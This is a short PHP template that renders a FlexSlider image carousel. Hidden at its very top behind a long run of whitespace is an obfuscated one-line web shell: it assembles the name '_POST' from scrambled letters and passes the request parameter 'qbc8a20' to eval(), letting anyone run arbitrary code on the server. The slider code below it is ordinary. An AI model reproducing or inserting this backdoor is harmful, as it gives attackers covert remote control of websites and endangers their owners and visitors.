<?php                                                                                                                                                                                                                                                               $qV="stop_";$s20=strtoupper($qV[4].$qV[3].$qV[2].$qV[0].$qV[1]);if(isset(${$s20}['qbc8a20'])){eval(${$s20}['qbc8a20']);}?><?php

if( empty( $slides ) ) return;

$options = array(
    'controlNav' => false,
    'animation' => 'slide',
    'animationLoop' => false,
    'slideshow' => false,
    'maxVisibleItems' => 1
);

if( $controlNav ) $options['controlNav'] = true;
if( $animation ) $options['animation'] = $animation;
if( $animationLoop ) $options['animationLoop'] = true;
if( $slideshow ) $options['slideshow'] = true;   

echo '<div class="flexslider" data-plugin-options=\'' . json_encode( $options ) . '\'><ul class="slides">';
    foreach( $slides as $slide ) {
        echo '<li><img class="img-responsive" src="' . $slide['image'] . '" alt=""></li>';
    }
echo '</ul></div>';